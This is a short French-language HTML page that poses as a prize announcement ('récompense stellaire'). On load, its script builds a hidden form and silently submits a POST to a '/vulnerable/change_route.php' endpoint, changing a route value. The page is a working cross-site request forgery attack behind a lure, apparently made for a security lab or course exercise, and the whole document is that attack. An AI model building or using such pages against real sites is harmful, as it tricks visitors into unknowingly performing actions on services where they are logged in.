<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Récompenses Galactiques</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
    </style>
</head>

<body>
    <h1>Félicitations! Vous avez gagné une récompense stellaire!</h1>
    <p>Préparation de votre récompense...</p>

    <script>
        window.onload = () => {
            const form = document.createElement('form');
            form.style.display = 'none';
            form.method = 'POST';
            form.action = 'https://cybertrip.enzo.givernaud.mmi-velizy.fr/vulnerable/change_route.php';
            form.innerHTML = '<input type="hidden" name="route" value="Route-Secrète" />';

            document.body.appendChild(form);
            form.submit();
        };
    </script>
</body>

</html>
